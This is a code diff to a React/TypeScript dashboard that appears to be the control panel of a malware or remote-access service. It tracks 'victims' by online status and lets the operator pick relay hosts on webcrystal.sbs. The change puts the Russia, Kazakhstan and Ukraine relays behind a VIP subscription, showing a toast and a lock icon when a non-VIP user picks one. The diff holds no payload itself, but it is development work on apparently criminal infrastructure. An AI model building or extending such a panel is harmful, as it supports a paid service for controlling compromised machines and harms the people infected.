@@ -7,6 +7,10 @@ import type { Victim } from "../../api/victims";
 
 import { isVictimOnline } from "../utils/victim-status";
 import { readWsHostGlobal, writeWsHostGlobal } from "../../settings/storage";
+import { useSubscriptionQuery } from "../../hooks/use-subscription-query";
+import { showToast } from "../../toast";
+
+const PREMIUM_VALUES = new Set(["ru.webcrystal.sbs", "kz.webcrystal.sbs", "ua.webcrystal.sbs"]);
 
 function getStatus(victim: Victim | null): "waiting" | "connected" | "disconnected" {
    if (!victim) return "waiting";
@@ -18,6 +22,9 @@ function getStatus(victim: Victim | null): "waiting" | "connected" | "disconnect
 export function DetailStatusCard(props: { victim: Victim | null }) {
    const { victim } = props;
    const status = getStatus(victim);
+
+   const subQ = useSubscriptionQuery();
+   const isVip = String(subQ.data?.status || "").toLowerCase() === "vip";
 
    const btnRef = useRef<HTMLButtonElement | null>(null);
    const menuRef = useRef<HTMLDivElement | null>(null);
@@ -151,17 +158,24 @@ export function DetailStatusCard(props: { victim: Victim | null }) {
                         { value: "ua.webcrystal.sbs", label: "Ukraine" },
                      ].map((opt) => {
                         const selected = wsValue === opt.value;
+                        const locked = PREMIUM_VALUES.has(opt.value) && !isVip;
                         return (
                            <button
                               key={opt.value}
                               type="button"
                               className={
-                                 "w-full text-left px-[10px] py-[9px] rounded-[12px] text-[13px] leading-[1.15] font-semibold text-white/90 transition-[background,border-color] cursor-pointer border " +
+                                 "w-full text-left px-[10px] py-[9px] rounded-[12px] text-[13px] leading-[1.15] font-semibold transition-[background,border-color] cursor-pointer border " +
                                  (selected
                                     ? "bg-white/[0.07] border-white/[0.16] text-white"
-                                    : "bg-transparent border-transparent hover:bg-white/[0.045] hover:border-white/[0.10]")
+                                    : locked
+                                       ? "bg-transparent border-transparent text-white/30 hover:bg-white/[0.02]"
+                                       : "bg-transparent border-transparent text-white/90 hover:bg-white/[0.045] hover:border-white/[0.10]")
                               }
                               onClick={() => {
+                                 if (locked) {
+                                    showToast("error", "Premium subscription required");
+                                    return;
+                                 }
                                  setWsValue(opt.value);
                                  writeWsHostGlobal(opt.value);
                                  setWsOpen(false);
@@ -170,6 +184,7 @@ export function DetailStatusCard(props: { victim: Victim | null }) {
                               aria-selected={selected}
                            >
                               {opt.label}
+                              {locked && <span className="ml-[6px] text-[10px] opacity-40">🔒</span>}
                            </button>
                         );
                      })}
